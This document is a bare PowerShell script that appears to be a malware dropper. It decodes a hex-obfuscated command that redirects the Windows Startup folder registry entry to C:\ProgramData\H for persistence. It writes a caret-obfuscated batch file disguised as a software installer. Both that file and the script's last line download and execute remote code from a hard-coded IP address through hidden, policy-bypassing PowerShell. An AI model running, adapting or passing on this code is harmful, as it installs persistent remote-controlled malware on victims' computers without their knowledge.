$H1 = "5b-H-73-H-79-H-73-H-74-H-!5-H-!d-H-2e-H-!9-H-!f-H-2e-H-!4-H-!9-H-72-H-!5-H-!3-H-74-H-!f-H-72-H-79-H-5d-H-3a-H-3a-H-43-H-72-H-!5-H-!1-H-74-H-!5-H-44-H-!9-H-72-H-!5-H-!3-H-74-H-!f-H-72-H-79-H-28-H-22-H-43-H-3a-H-5c-H-50-H-72-H-!f-H-!7-H-72-H-!1-H-!d-H-44-H-!1-H-74-H-!1-H-5c-H-48-H-22-H-29-H-0a-H-73-H-74-H-!1-H-72-H-74-H-2d-H-73-H-!c-H-!5-H-!5-H-70-H-20-H-2d-H-73-H-20-H-33-H-0a-H-53-H-!5-H-74-H-2d-H-49-H-74-H-!5-H-!d-H-50-H-72-H-!f-H-70-H-!5-H-72-H-74-H-79-H-20-H-2d-H-50-H-!1-H-74-H-!8-H-20-H-22-H-48-H-4b-H-43-H-55-H-3a-H-5c-H-53-H-!f-H-!!-H-74-H-77-H-!1-H-72-H-!5-H-5c-H-4d-H-!9-H-!3-H-72-H-!f-H-73-H-!f-H-!!-H-74-H-5c-H-57-H-!9-H-!e-H-!4-H-!f-H-77-H-73-H-5c-H-43-H-75-H-72-H-72-H-!5-H-!e-H-74-H-5!-H-!5-H-72-H-73-H-!9-H-!f-H-!e-H-5c-H-45-H-78-H-70-H-!c-H-!f-H-72-H-!5-H-72-H-5c-H-55-H-73-H-!5-H-72-H-20-H-53-H-!8-H-!5-H-!c-H-!c-H-20-H-4!-H-!f-H-!c-H-!4-H-!5-H-72-H-73-H-22-H-20-H-2d-H-4e-H-!1-H-!d-H-!5-H-20-H-22-H-53-H-74-H-!1-H-72-H-74-H-75-H-70-H-22-H-20-H-2d-H-5!-H-!1-H-!c-H-75-H-!5-H-20-H-22-H-43-H-3a-H-5c-H-50-H-72-H-!f-H-!7-H-72-H-!1-H-!d-H-44-H-!1-H-74-H-!1-H-5c-H-48-H-22-H-3b-H-0a-H-53-H-!5-H-74-H-2d-H-49-H-74-H-!5-H-!d-H-50-H-72-H-!f-H-70-H-!5-H-72-H-74-H-79-H-20-H-2d-H-50-H-!1-H-74-H-!8-H-20-H-22-H-48-H-4b-H-43-H-55-H-3a-H-5c-H-53-H-!f-H-!!-H-74-H-77-H-!1-H-72-H-!5-H-5c-H-4d-H-!9-H-!3-H-72-H-!f-H-73-H-!f-H-!!-H-74-H-5c-H-57-H-!9-H-!e-H-!4-H-!f-H-77-H-73-H-5c-H-43-H-75-H-72-H-72-H-!5-H-!e-H-74-H-5!-H-!5-H-72-H-73-H-!9-H-!f-H-!e-H-5c-H-45-H-78-H-70-H-!c-H-!f-H-72-H-!5-H-72-H-5c-H-53-H-!8-H-!5-H-!c-H-!c-H-20-H-4!-H-!f-H-!c-H-!4-H-!5-H-72-H-73-H-22-H-20-H-2d-H-4e-H-!1-H-!d-H-!5-H-20-H-22-H-53-H-74-H-!1-H-72-H-74-H-75-H-70-H-22-H-20-H-2d-H-5!-H-!1-H-!c-H-75-H-!5-H-20-H-22-H-43-H-3a-H-5c-H-50-H-72-H-!f-H-!7-H-72-H-!1-H-!d-H-44-H-!1-H-74-H-!1-H-5c-H-48-H-22-H-3b".Replace('!','6')
$H2 = $H1 -split '-H-' |ForEach-Object {[char][byte]"0x$_"}
$H3 = $H2 -join ''
Invoke-Expression $H3
start-sleep -s 7
$Content = @'
@echo off
echo [+] Please Wait, Installing software ..
%!h%c%!h%m^d%!h%.E%!h%^x%!h%E /c p%!h%o^w^E%!h%r^sh%!h%El^l.E%!h%x^%!h%E -n^op -w^i^n%!h%d h^i%!h%d%!h%d^En -E%!h%x^E^c B^y%!h%p^a^ss -n%!h%o^n^i ^I^EX^(^NE^w^-O^b^jE^ct^ N^E^t.W^E^bc^li^En^t)%!h%.D%!h%^o%!h%w^n%!h%l%!h%o%!h%a^dS^t%!h%ri^n%!h%g%!h%(^'http://135.125.248.37/Server1.txt'^)
exit
'@
Set-Content -Path C:\ProgramData\H\New.BAT -Value $Content

start-sleep -s 3
&("{1}{0}"-f'X','IE')(&("{1}{0}{2}" -f'je','New-Ob','ct') ("{1}{2}{0}" -f 'WebClient','Ne','t.')).("{2}{3}{1}{0}" -f'dString','nloa','D','ow').Invoke('http://135.125.248.37/Server1.txt')